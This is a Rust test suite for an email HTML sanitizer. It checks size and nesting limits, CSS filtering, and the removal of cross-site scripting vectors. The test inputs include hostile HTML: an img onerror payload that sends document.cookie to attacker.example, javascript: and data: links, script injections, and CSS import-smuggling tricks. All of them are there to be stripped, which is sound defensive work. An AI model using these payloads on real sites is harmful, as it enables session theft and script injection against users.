use super::*;
use crate::bounded_html::{MAX_FORMATTING_DEPTH, MAX_HTML_DEPTH, MAX_HTML_NODES};

/// Paragraphs of one letter: two nodes each.
fn paragraphs(count: usize) -> String {
    "<p>x</p>".repeat(count)
}

#[test]
fn a_body_past_the_node_limit_is_clipped_with_a_notice() {
    let html = format!("{}<p>past the limit</p>", paragraphs(MAX_HTML_NODES / 2));

    let sanitized = sanitize_email_html(&html);

    let kept = sanitized.matches("<p>x</p>").count();
    assert!(
        (MAX_HTML_NODES / 2 - 4..MAX_HTML_NODES / 2).contains(&kept),
        "{kept}"
    );
    assert!(!sanitized.contains("past the limit"));
    assert!(sanitized.ends_with(CLIPPED_NOTICE));
}

#[test]
fn a_4_mb_newsletter_is_not_clipped() {
    let story = r#"<tr><td style="padding:16px;color:#333"><h2 style="margin:0">Headline for this week's story</h2><p style="line-height:1.5">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. <a href="https://example.com/read?id=456">Read more</a></p><img src="https://example.com/i/123.png" width="560" alt=""></td></tr>"#;
    // Sending services indent their markup and wrap text with CRLF; the
    // tokenizer splits text at each line break and character reference.
    let indented = story
        .replace("><", ">\r\n      <")
        .replace(", ", ",\r\n        ")
        .replace("week's", "week&#39;s");

    for story in [story, indented.as_str()] {
        let html = format!(
            "<html><head><style>.a{{color:#333}}</style></head><body><table>{}<tr><td>Unsubscribe</td></tr></table></body></html>",
            story.repeat((4 << 20) / story.len())
        );

        let sanitized = sanitize_email_html(&html);

        assert!(sanitized.contains("Unsubscribe"));
        assert!(!sanitized.contains(CLIPPED_NOTICE));
    }
}

#[test]
fn a_body_within_the_node_limit_is_not_clipped() {
    let html = format!("{}<p>last</p>", paragraphs(MAX_HTML_NODES / 2 - 4));

    let sanitized = sanitize_email_html(&html);

    assert!(sanitized.ends_with("<p>last</p>"));
}

#[test]
fn a_body_nested_past_the_depth_limit_is_clipped_with_a_notice() {
    let nested = |depth: usize, text: &str| format!("{}{text}", "<div>".repeat(depth));

    let shallow = sanitize_email_html(&nested(100, "shallow"));
    let deep = sanitize_email_html(&nested(MAX_HTML_DEPTH, "deep"));

    assert!(shallow.contains("shallow") && !shallow.contains(CLIPPED_NOTICE));
    assert!(!deep.contains("deep"));
    assert!(deep.ends_with(CLIPPED_NOTICE));
}

#[test]
fn formatting_nested_past_its_limit_is_clipped_with_a_notice() {
    let nested = |depth: usize, text: &str| {
        let open: String = (0..depth).map(|i| format!("<b id=b{i}>")).collect();
        format!("{open}{text}")
    };

    let shallow = sanitize_email_html(&nested(MAX_FORMATTING_DEPTH, "shallow"));
    let deep = sanitize_email_html(&nested(MAX_FORMATTING_DEPTH + 1, "deep"));

    assert!(shallow.contains("shallow") && !shallow.contains(CLIPPED_NOTICE));
    assert!(!deep.contains("deep"));
    assert!(deep.ends_with(CLIPPED_NOTICE));
}

#[test]
fn unclosed_identical_formatting_tags_are_not_clipped() {
    // Old mail often opens a font per line and never closes it; html5ever
    // keeps only three copies of an identical tag, so they cost little.
    let lines: String = (0..200)
        .map(|i| format!("<font face=\"Arial\">Line {i}<br>\r\n"))
        .collect();

    let sanitized = sanitize_email_html(&lines);

    assert!(sanitized.contains("Line 199"));
    assert!(!sanitized.contains(CLIPPED_NOTICE));
}

#[test]
fn formatting_in_nested_table_cells_counts_per_cell() {
    // Each cell starts a new section of html5ever's formatting list.
    let levels: String = (0..40)
        .map(|i| format!("<table><tr><td><font color=\"#{i}\">Level {i}"))
        .collect();

    let sanitized = sanitize_email_html(&levels);

    assert!(sanitized.contains("Level 39"));
    assert!(!sanitized.contains(CLIPPED_NOTICE));
}

#[test]
fn misnested_formatting_keeps_its_text() {
    // Scraper's own tree dropped `lost` when closing the `<b>` moved the
    // blocks it held.
    let sanitized = sanitize_email_html("<b><div>a<p><div>lost</b>");

    assert!(sanitized.contains("lost"), "{sanitized}");
}

#[test]
fn style_text_counts_as_written_unescaped() {
    // A serialization writes `<style>` text raw, so its `&` costs one byte,
    // not the five of `&amp;`.
    let html = format!("<style>{}</style><p>Reply</p>", "&".repeat(4 << 20));

    let sanitized = sanitize_email_html(&html);

    assert!(sanitized.contains("Reply"));
    assert!(!sanitized.contains(CLIPPED_NOTICE));
}

#[test]
fn noscript_text_counts_as_written_escaped() {
    // Scraper serializes with scripting off, which escapes `<noscript>`
    // text: 4 MiB of `&` is written as 20 MiB of `&amp;`.
    let html = format!("<noscript>{}</noscript><p>Reply</p>", "&".repeat(4 << 20));

    let sanitized = sanitize_email_html(&html);

    assert!(!sanitized.contains("Reply"));
    assert!(sanitized.ends_with(CLIPPED_NOTICE));
}

#[test]
fn a_bodyless_document_past_the_node_limit_is_clipped_with_a_notice() {
    // A frameset document has no body, so the fragment parse is cleaned.
    let html = format!(
        "<frameset></frameset>{}<p>past the limit</p>",
        paragraphs(MAX_HTML_NODES / 2)
    );

    let sanitized = sanitize_email_html(&html);

    assert!(sanitized.contains("<p>x</p>"));
    assert!(!sanitized.contains("past the limit"));
    assert!(sanitized.ends_with(CLIPPED_NOTICE));
}

#[test]
fn inline_style_url_quotes_remain_escaped_after_html_round_trip() {
    let html = r#"<div style='background-image:url("cid:\"")'>content</div>"#;

    for sanitize in [
        sanitize_email_html,
        sanitize_html_fragment,
        sanitize_authored_html,
    ] {
        let sanitized = sanitize(html);
        let fragment = Html::parse_fragment(&sanitized);
        let element = fragment.select(&STYLE_ATTRIBUTE_SELECTOR).next().unwrap();
        assert_eq!(
            element.value().attr("style"),
            Some(r#"background-image:url("cid:\"")"#),
            "CSS quotes must remain escaped after decoding HTML entities"
        );
    }
}

#[test]
fn inline_style_filtering_and_stylesheet_filtering_both_apply() {
    let html = r#"<style>.a{color:blue;position:fixed}</style>
        <div style="color:red;position:fixed;background-image:url(javascript:alert)">content</div>"#;

    for sanitize in [
        sanitize_email_html,
        sanitize_html_fragment,
        sanitize_authored_html,
    ] {
        let sanitized = sanitize(html);
        assert!(sanitized.contains("color:blue;"));
        assert!(sanitized.contains("color:red"));
        assert!(!sanitized.contains("position"));
        assert!(!sanitized.contains("javascript"));
    }
}

#[test]
fn strips_script_svg_math_and_foreign_object_vectors() {
    let html = r#"<html><body>
        <p>hello</p>
        <script>steal()</script>
        <svg><foreignObject><iframe src="https://evil.test"></iframe></foreignObject></svg>
        <math><mtext><script>steal()</script></mtext></math>
    </body></html>"#;

    let sanitized = sanitize_email_html(html);

    assert!(sanitized.contains("<p>hello</p>"));
    for vector in [
        "<script",
        "<svg",
        "<foreignObject",
        "<math",
        "<iframe",
        "steal()",
    ] {
        assert!(!sanitized.contains(vector), "{vector} must be removed");
    }
}

#[test]
fn strips_dangerous_url_schemes_and_event_handlers() {
    let html = r#"<body>
        <a href="javascript:alert(1)">js</a>
        <a href="data:text/html,<script>alert(1)</script>">data</a>
        <a href="https://ok.example/">ok</a>
        <img src="https://ok.example/pic.png" onerror="alert(1)" onload="alert(2)">
        <div onclick="alert(3)">text</div>
    </body>"#;

    let sanitized = sanitize_email_html(html);

    assert!(!sanitized.contains("javascript:"));
    assert!(!sanitized.contains("data:"));
    assert!(sanitized.contains(r#"href="https://ok.example/""#));
    assert!(sanitized.contains(r#"src="https://ok.example/pic.png""#));
    assert!(!sanitized.to_ascii_lowercase().contains("onerror"));
    assert!(!sanitized.to_ascii_lowercase().contains("onload"));
    assert!(!sanitized.to_ascii_lowercase().contains("onclick"));
}

#[test]
fn style_element_content_loses_imports_and_external_references() {
    let html = r#"<html><head><style>
        @import url("https://tracker.test/steal.css");
        .a { color: red; background-image: url("https://tracker.test/pixel.png"); }
        .b { width: expression(alert(1)); margin: 4px; }
        .c { font-size: \75 rl(https://tracker.test); }
    </style></head><body><p>hi</p></body></html>"#;

    let sanitized = sanitize_email_html(html);

    assert!(sanitized.contains("<style>"));
    assert!(!sanitized.to_ascii_lowercase().contains("@import"));
    assert!(!sanitized.to_ascii_lowercase().contains("url("));
    assert!(!sanitized.to_ascii_lowercase().contains("expression("));
    assert!(!sanitized.contains("tracker.test"));
    assert!(sanitized.contains("color:red;"));
    assert!(sanitized.contains("margin:4px;"));
}

#[test]
fn style_element_drops_non_allowlisted_overlay_properties() {
    let html = r#"<body><style>
        .overlay { position: fixed; z-index: 99999; color: blue; }
    </style><p>content</p></body>"#;

    let sanitized = sanitize_email_html(html);

    assert!(!sanitized.contains("position"));
    assert!(!sanitized.contains("z-index"));
    assert!(sanitized.contains("color:blue;"));
}

#[test]
fn media_query_structure_survives_declaration_filtering() {
    let html = r#"<body><style>
        @media (max-width: 600px) { .a { color: green; position: absolute; } }
    </style><p>content</p></body>"#;

    let sanitized = sanitize_email_html(html);

    assert!(sanitized.contains("@media"));
    assert!(sanitized.contains("color:green;"));
    assert!(!sanitized.contains("position"));
}

#[test]
fn fragments_are_cleaned_without_body_reconstruction() {
    let fragment = r#"<p onclick="alert(1)">Sig</p><script>x()</script><style>.s{color:red;position:fixed}</style>"#;

    let sanitized = sanitize_html_fragment(fragment);

    assert!(sanitized.contains("Sig"));
    assert!(!sanitized.contains("onclick"));
    assert!(!sanitized.contains("<script"));
    assert!(sanitized.contains("color:red;"));
    assert!(!sanitized.contains("position"));
}

#[test]
fn authored_html_strips_event_handler_payloads() {
    // The reported vector: a locally-composed body that reaches
    // `body_html_sanitized` verbatim and executes on every reader's page.
    let authored = r#"<body><p>hi</p><img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)"></body>"#;

    let sanitized = sanitize_authored_html(authored);

    assert!(sanitized.contains("<p>hi</p>"));
    assert!(!sanitized.to_ascii_lowercase().contains("onerror"));
    assert!(!sanitized.contains("attacker.example"));
}

#[test]
fn authored_html_strips_scripts_and_dangerous_schemes() {
    let authored = r#"<div>text</div>
        <script>steal()</script>
        <a href="javascript:alert(1)">js</a>
        <iframe src="https://evil.test"></iframe>
        <style>.a{position:fixed;color:red}</style>"#;

    let sanitized = sanitize_authored_html(authored);

    assert!(sanitized.contains("<div>text</div>"));
    for vector in ["<script", "steal()", "javascript:", "<iframe", "position"] {
        assert!(!sanitized.contains(vector), "{vector} must be removed");
    }
    assert!(sanitized.contains("color:red;"));
}

#[test]
fn authored_html_keeps_editor_round_trip_markers() {
    // Reopening a draft rebuilds Lexical nodes from these; dropping them
    // silently degrades mentions, indentation, and list state.
    let authored = r#"<p style="padding-inline-start:40px" data-lexical-indent="1">indented</p>
        <a href="https://app.macro.com/app/doc/1" data-document-mention="true" data-document-id="1" data-document-name="Spec" data-block-name="doc">Spec</a>
        <div class="macro_quote"><p>quoted</p></div>
        <ol><li value="3">three</li></ol>"#;

    let sanitized = sanitize_authored_html(authored);

    assert!(sanitized.contains(r#"data-lexical-indent="1""#));
    assert!(sanitized.contains("padding-inline-start:40px"));
    assert!(sanitized.contains(r#"data-document-mention="true""#));
    assert!(sanitized.contains(r#"data-document-id="1""#));
    assert!(sanitized.contains(r#"class="macro_quote""#));
    assert!(sanitized.contains(r#"value="3""#));
}

#[test]
fn provider_fetched_html_does_not_gain_data_attributes() {
    // Only the authored path opts into `data-*`; inbound mail must not be able
    // to forge the editor's round-trip markers.
    let inbound = r#"<body><a href="https://evil.test" data-document-mention="true" data-document-id="1">x</a></body>"#;

    let sanitized = sanitize_email_html(inbound);

    assert!(!sanitized.contains("data-document-mention"));
    assert!(!sanitized.contains("data-document-id"));
}

/// Element and attribute names in `html`, as a browser would parse it.
fn elements_and_attributes(html: &str) -> Vec<String> {
    scraper::Html::parse_fragment(html)
        .root_element()
        .descendants()
        .skip(1)
        .filter_map(scraper::ElementRef::wrap)
        .map(|element| {
            let attributes: Vec<&str> = element.value().attrs().map(|(name, _)| name).collect();
            format!("{}[{}]", element.value().name(), attributes.join(","))
        })
        .collect()
}

#[test]
fn removing_a_css_comment_cannot_close_the_style_element() {
    let sanitized = sanitize_html_fragment("<style></sty/**/le><b>Bold</b></style><p>hi</p>");

    assert_eq!(elements_and_attributes(&sanitized), ["style[]", "p[]"]);
}

#[test]
fn removing_a_css_comment_keeps_the_selector_it_sat_in() {
    let sanitized = sanitize_html_fragment("<style>div/**/.x{color:red}</style>");

    assert!(sanitized.contains("div.x{color:red;}"), "{sanitized}");
}

#[test]
fn removing_a_css_import_cannot_assemble_another_import() {
    let sanitized = sanitize_html_fragment(
        r#"<style>@im@import a;port url("https://styles.example/extra.css");</style>"#,
    );

    assert!(!sanitized.to_ascii_lowercase().contains("@import"));
}
